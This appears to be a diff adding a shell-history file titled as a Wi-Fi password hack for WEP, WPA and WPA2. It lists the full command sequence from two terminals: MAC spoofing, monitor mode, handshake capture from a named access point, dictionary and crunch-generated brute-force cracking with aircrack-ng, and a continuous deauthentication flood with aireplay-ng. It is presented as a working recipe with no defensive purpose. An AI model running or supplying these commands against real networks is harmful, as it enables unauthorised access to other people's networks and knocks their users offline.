@@ -1,0 +1,32 @@
+						wifi password hack(wep, wpa, wpa2)
+
+				first terminal
+    1  cd Desktop/
+    3  nano passlist.txt
+    4  ls
+    5  aircrack-ng -w passlist.txt 
+    6  ifconfig 
+    7  ifconfig wlan0 down
+    8  macchanger -r wlan0
+    9  iwconfig wlan0 mode monitor
+   10  ifconfig wlan0 up
+   11  iwconfig
+   12  iwconfig wlan0
+   13  iwconfig wlan0 | grep Mode
+   14  clear
+   15  airmon-ng check wlan0
+   16  kill 1211
+   17  kill 1259
+   18  airmon-ng check wlan0
+   19  clear
+   20  airodump-ng wlan0
+   21  airodump-ng -c 6 -w SCANNED_result_test --bssid C8:3A:35:2A:BF:48 wlan0
+   22  ls
+   23  aircrack-ng -w passlist.txt SCANNED_result_test-01.cap -e soutln 
+				kam 
+			crunch 10 11 -t %%%%hpoop 1234567890 | aircrack-ng -w - SCANNED_result_test-01.cap -e soutln
+   24  history > first.txt
+
+				second terminal
+    1  aireplay-ng -0 0 -a C8:3A:35:2A:BF:48 wlan0
+    2  history > second.txt
